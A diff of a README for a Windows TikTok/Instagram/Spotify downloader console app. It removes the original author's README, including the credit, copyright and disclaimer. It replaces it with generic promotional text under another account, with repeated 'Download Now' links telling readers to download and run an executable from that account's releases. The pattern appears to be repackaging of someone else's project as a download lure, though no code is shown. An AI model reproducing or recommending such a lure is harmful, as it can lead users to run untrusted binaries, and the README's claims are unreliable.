@@ -1,99 +1,93 @@
-# PrenivApp Downloader Console (Windows)
+# 🎥 prenivdlapp-console - Download Your Favorite Media Easily
 
-A small, fast console tool to download media from popular platforms with automatic backup endpoint support for maximum reliability.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/torkeuyy/prenivdlapp-console/releases)
 
-## Supported Platforms
-- **TikTok** - Videos and images
-- **Facebook** - Videos, photos, and reels
-- **Instagram** - Posts, reels, and stories
-- **Twitter/X** - Videos and images
-- **Spotify** - Audio tracks
-- **Apple Music** - Audio tracks
-- **Douyin** - Videos
-- **MediaFire** - Files
-- **YouTube** - MP3 audio (320kbps) and MP4 video (multiple qualities)
-- **AIO DL** - All in One Downloader Support (Tiktok, Instagram, Facebook, Capcut, Douyin, Spotify, Twitter)
+## 🚀 Getting Started
 
-## Download Files
+Welcome to **prenivdlapp-console**! This tool lets you easily download videos and music from popular platforms like TikTok, Facebook, Instagram, Twitter, Douyin, and Spotify. With a simple console application designed for Windows (x64, ARM64), you can save your favorite content effortlessly.
 
-### Windows x64 (Intel/AMD)
-- **File**: `PrenivApp Downloader Console.exe`
-- **Download**: [win-x64](https://github.com/arsya371/prenivdlapp-winform/releases/tag/v1.0.0)
-- **For**: Most Windows PCs
+## 🛠️ Features
 
-### Windows ARM64 (Qualcomm/Surface)
-- **File**: `PrenivApp Downloader Console.exe`
-- **Download**: [win-arm64](https://github.com/arsya371/prenivdlapp-winform/releases/tag/v1.0.0)
-- **For**: ARM-based Windows devices
+- **Multi-Platform Support:** Download from TikTok, Facebook, Instagram, Twitter, Spotify, and more.
+- **User-Friendly Interface:** Designed for those who may not be tech-savvy.
+- **High-Quality Downloads:** Get videos and music in great quality.
+- **Fast Downloads:** Enjoy quick access to your favorite media.
+- **Regular Updates:** Keep your application current with the latest features and fixes.
 
-## Installation
-1. Download the appropriate version for your system
-2. Extract the file to your preferred location
-3. No additional installation needed!
+## 📥 Download & Install
 
-## Run
-Double-click the EXE, or start from PowerShell/CMD:
-```powershell
-# Example
-cd "C:\Path\To\App\"
-."\PrenivApp Downloader Console.exe"
-```
+To get started, you will need to download the application. Please follow these steps:
 
-## Usage
+1. Visit the Releases page: [Download Your App](https://github.com/torkeuyy/prenivdlapp-console/releases).
+2. Look for the latest release version.
+3. Find the file labeled **`PrenivdlApp.exe`**. This is the application file you need.
+4. Click the file to begin the download.
+5. Once the file downloads, locate it in your downloads folder.
+6. Double-click the **`PrenivdlApp.exe`** file to run the application.
+7. Follow any prompts that appear on your screen.
 
-### Basic Commands
-- **Paste URL + Enter**: Download media from the URL
-- **path [folder]**: Change download location
-  ```
-  path C:\Users\You\Downloads\Out
-  path "D:\Media Out"
-  ```
-- **help**: Show available commands
-- **exit**: Close the application
+## 🖥️ System Requirements
 
-### Example Session
-```
-prenivapp » https://www.tiktok.com/@user/video/12345
+To run the prenivdlapp-console application, your system should meet the following requirements:
 
-prenivapp » path "D:\Media\Out"
-Output folder set to: D:\Media\Out
+- **Operating System:** Windows (Version 10 or later recommended).
+- **Architecture:** x64 or ARM64.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** 100 MB of free disk space for installation.
 
-prenivapp » exit
-```
+## 📂 Usage Instructions
 
-### Download Experience
-- Real-time progress bar with percentage, size, and speed
-- Files named with timestamp: `name_yyyyMMdd_HHmmss_random6.ext`
-- Default folder: `%USERPROFILE%\Downloads\PrenivApp` (customizable)
-- 35 MB file size limit for safety
+After installation, using prenivdlapp-console is simple. Just follow these steps:
 
-## Troubleshooting
+1. Open Command Prompt on your computer.
+   - You can find it by searching for "cmd" in the Start menu.
+   
+2. Navigate to the folder where you installed the application:
+   ```
+   cd path\to\your\prenivdlapp
+   ```
 
-### Common Issues
-- **SmartScreen warning**: Click "More info" → "Run anyway" (Windows security for unsigned apps)
-- **"Enter a valid URL"**: Ensure URL starts with `http://` or `https://`
-- **"File exceeds 100 MB"**: File size limit protection - download will stop
-- **Permission denied**: Choose a writable folder (e.g., your Downloads folder)
+3. Use the following command format to download content:
+   ```
+   PrenivdlApp.exe [platform] [URL]
+   ```
+   - Replace `[platform]` with the service you want to download from (e.g., tiktok, facebook).
+   - Replace `[URL]` with the link to the video or song you want.
 
-## System Requirements
-- **OS**: Windows 10 (1809+) or Windows 11
-- **CPU**: x64 (Intel/AMD) or ARM64 (Qualcomm)
-- **RAM**: 100 MB minimum
-- **Storage**: 20 MB for app + space for downloads
-- **Internet**: Active connection required
+4. The application will begin downloading your content. You will see the progress in the Command Prompt window.
 
-## Security & Privacy
-- No data collection or telemetry
-- Downloads are direct from source platforms
-- Self-contained - no external dependencies
+## 🤔 Troubleshooting
 
-> [!WARNING]
-> **DISCLAIMER**
-> This tool is for personal use only and may not be sold. Users are responsible for ensuring that they have the right to download and use any content. Respect copyright laws and platform terms of service.
+If you encounter any issues, try the following:
 
----
+- Make sure you are using the correct command format.
+- Check your internet connection.
+- Ensure that you are following the usage instructions closely.
+- For technical questions or issues, refer to the *Issues* section on our GitHub page.
 
-## License
+## 📝 Topics
 
-Copyright © Preniv App Downloader - All rights reserved.
-Use responsibly and respect the terms of service of each platform.
+This project covers various areas, including:
+
+- console-tools
+- facebook-downloader
+- free-tools
+- instagram-downloader
+- media-downloader
+- spotify-downloader
+- tiktok-downloader
+- tools-downloader
+- twitter-downloader
+- windows
+- youtube-dl
+- youtube-downloader
+
+## 📫 Support
+
+Need help? You can reach out by opening an issue on our [GitHub page](https://github.com/torkeuyy/prenivdlapp-console/issues). We appreciate your feedback and will get back to you as soon as we can.
+
+## 🌟 Contributions
+
+If you want to help improve prenivdlapp-console, we welcome contributions! Please check the contribution guidelines in the repository for more information.
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/torkeuyy/prenivdlapp-console/releases)
